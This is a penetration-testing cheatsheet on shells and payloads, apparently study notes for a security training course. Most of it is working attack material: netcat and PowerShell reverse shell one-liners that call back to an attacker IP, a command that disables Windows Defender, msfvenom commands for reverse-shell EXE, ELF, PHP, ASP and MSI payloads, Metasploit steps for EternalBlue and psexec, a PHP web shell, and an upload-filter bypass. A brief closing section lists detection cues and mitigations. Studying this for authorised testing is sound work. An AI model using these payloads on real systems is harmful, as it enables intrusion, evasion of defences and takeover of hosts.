# Shells & Payloads Cheatsheet

## Shell Types

| Type | Description |
|---|---|
| Bind shell | Target listens, attacker connects to it. Easier to block (inbound connection). |
| Reverse shell | Attacker listens, target calls back. Harder to block (outbound connection). |
| Web shell | Browser-based code execution via a file uploaded to a web server. |

## Identifying the Shell Environment
```bash
ps                    # shows active processes including shell type
env                   # shows SHELL= variable
echo $0               # prints current shell
```
Windows prompt clues: `C:\>` = cmd.exe, `PS C:\>` = PowerShell.

---

## Bind Shell (Netcat)
```bash
# Target (server): start listener and bind bash to it
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> 7777 > /tmp/f

# Attack host (client): connect to it
nc -nv <target_IP> 7777
```

## Reverse Shell

### Linux (Netcat/Bash one-liner)
```bash
# Attack host: start listener
sudo nc -lvnp 443

# Target: send shell back
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_IP> 443 > /tmp/f
```

### Windows (PowerShell one-liner)
Disable Defender first if needed (admin PowerShell):
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
Then on the target (cmd or PowerShell):
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Payload Types

### Staged vs Stageless
- **Staged** (`/shell/reverse_tcp`): sends a small stage first, pulls the rest from the attacker over the network. Uses less initial space but requires ongoing communication. Can be unstable on low-bandwidth links.
- **Stageless** (`_reverse_tcp`): entire payload sent at once. More reliable on restricted/low-bandwidth links, better for evasion (less network traffic).

Naming convention in MSF: slashes between segments = staged (`windows/meterpreter/reverse_tcp`), no slash between shell and transport = stageless (`windows/meterpreter_reverse_tcp`).

### Windows payload file types
| Type | Use |
|---|---|
| `.exe` | Standard executable, double-clicked by user or run via command |
| `.dll` | Injected into a running process or used for DLL hijacking |
| `.bat` | DOS batch file, automates commands via cmd.exe |
| `.vbs` | VBScript, used in phishing/macros |
| `.msi` | Windows Installer package, run with `msiexec` for elevated execution |
| `.ps1` | PowerShell script |

---

## MSFvenom Payload Generation
```bash
# List all payloads
msfvenom -l payloads

# Linux stageless reverse shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf

# Windows stageless reverse shell (EXE)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe

# Windows staged Meterpreter (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<IP> LPORT=443 -f raw > shell.php

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f asp > shell.asp

# MSI payload (for AlwaysInstallElevated or social engineering)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi > shell.msi
```

---

## Metasploit (msfconsole)
```bash
sudo msfconsole

# Basic workflow
search <keyword>          # find modules
use <module path or #>    # select module
options                   # view required settings
set RHOSTS <target IP>
set LHOST <attacker IP>
set LPORT 4444
exploit                   # launch

# Useful post-exploitation (inside Meterpreter)
getuid                    # current user
shell                     # drop to system shell
```

### Common exploit examples
```bash
# EternalBlue (MS17-010) - Windows 7/2008-2016
use auxiliary/scanner/smb/smb_ms17_010    # check first
use exploit/windows/smb/ms17_010_psexec
use exploit/windows/smb/ms17_010_eternalblue

# SMB psexec (requires valid admin creds)
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass <password>
set SHARE ADMIN$

# rConfig 3.9.6 (Linux web app)
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

---

## Windows Fingerprinting
```bash
# TTL-based OS guess from ping (128 = Windows, 64 = Linux)
ping <IP>

# Nmap OS detection
sudo nmap -v -O <IP>

# Nmap banner grab
sudo nmap -v <IP> --script banner.nse

# Full aggressive scan
nmap -v -A <IP>
```
Ports indicating Windows: 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM).

---

## Linux Fingerprinting
```bash
nmap -sC -sV <IP>
```
Ports indicating Linux web stack: 22 (SSH), 80/443 (Apache/Nginx), 3306 (MySQL), 21 (FTP).
TTL of 64 in ping response typically indicates Linux.

---

## Spawning Interactive / TTY Shells
When you land in a non-interactive (jail) shell, upgrade it:

```bash
# Python (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

# Direct shell invocation
/bin/sh -i
/bin/bash -i

# Perl
perl -e 'exec "/bin/sh";'

# Ruby
ruby -e 'exec "/bin/sh"'

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

# Lua
lua: os.execute('/bin/sh')

# Vim
vim -c ':!/bin/sh'
# or inside vim:
:set shell=/bin/sh
:shell
```
After spawning with Python, fully upgrade the shell:
```bash
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Check sudo permissions once in an interactive shell:
```bash
sudo -l
```

---

## Web Shells

### PHP web shell (simplest form)
```php
<?php system($_GET['cmd']); ?>
```
Access via: `http://target/shell.php?cmd=whoami`

### Laudanum (pre-built, multi-language)
```bash
# Location on Parrot/Kali
ls /usr/share/laudanum/

# Copy and modify before uploading (add your IP to allowedIps)
cp /usr/share/laudanum/aspx/shell.aspx /tmp/demo.aspx
```

### Antak (ASPX, PowerShell-based)
```bash
ls /usr/share/nishang/Antak-WebShell/
cp /usr/share/nishang/Antak-WebShell/antak.aspx /tmp/upload.aspx
# Edit line 14: set username and password before uploading
```

### Bypassing file type restrictions (Burp)
1. Intercept the file upload POST request in Burp.
2. Change `Content-Type: application/x-php` to `Content-Type: image/gif`.
3. Forward the request.

### Web shell considerations
- Web apps may auto-delete uploaded files after a set period.
- Non-interactive shells limit enumeration and pivoting.
- Use the web shell to gain a foothold, then upgrade to a full reverse shell.
- Remove uploaded files after the engagement, document file names and hashes.

---

## CMD vs PowerShell (When to Use Which)

| Use CMD when | Use PowerShell when |
|---|---|
| Target is old (pre-Windows 7, no PS) | You need cmdlets or custom scripts |
| Simple commands/batch files | Interacting with .NET objects |
| Execution policy may block PS | Working with cloud services |
| Stealth matters (CMD leaves fewer logs) | Using Aliases or advanced PS features |
| Using MS-DOS native tools | Running PS-based C2 payloads |

---

## Notable Windows Vulnerabilities (Quick Reference)

| CVE / Name | Affected | Vector |
|---|---|---|
| MS08-067 | Windows XP/2003 | SMB RCE |
| EternalBlue (MS17-010) | Windows 7 to Server 2016 | SMB v1 RCE |
| PrintNightmare | Most Windows | Print Spooler RCE/LPE |
| BlueKeep (CVE-2019-0708) | Windows 2000 to Server 2008 R2 | RDP RCE |
| Sigred (CVE-2020-1350) | Windows DNS Server | DNS SIG record RCE |
| SeriousSam (CVE-2021-36934) | Windows 10/11 | SAM database access via shadow copy |
| Zerologon (CVE-2020-1472) | Domain Controllers | Netlogon crypto flaw, DA privesc |

---

## Detection Considerations (Blue Team Awareness)

### Suspicious user agent strings for common Windows transfer/execution tools
| Technique | User-Agent |
|---|---|
| PowerShell Invoke-WebRequest | `WindowsPowerShell/<version>` |
| certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |
| Meterpreter default | Varies, often looks like browser traffic |

### Key MITRE ATT&CK tactics in this module
- **Initial Access** (T1190): exploit public-facing app (web app, SMB, RDP)
- **Execution** (T1059): payloads run on target (PowerShell, cmd, bash, web shells)
- **Command & Control** (T1071): shells communicate back over HTTP/S, DNS, or raw TCP

### What defenders should watch
- File uploads to web servers, especially non-image files in image directories
- Non-admin users running `whoami`, `net user`, `net localgroup`, or PowerShell
- Outbound connections on unusual ports (4444, 1234, 8888) or heartbeats on non-standard ports
- Clear-text shell traffic (Netcat sessions fully readable in Wireshark)
- New local user accounts being created

### Mitigations
- Application sandboxing for public-facing services
- Least privilege across all accounts and services
- Host segmentation and DMZ for internet-facing hosts
- Firewall rules blocking unexpected inbound/outbound ports
- AV/EDR on all end devices and servers (keep Windows Defender enabled)
- Patch management, especially for SMB (MS17-010) and RDP (BlueKeep)
- PowerShell and command-line logging
- Network visibility baseline with NetFlow monitoring and SIEM alerting
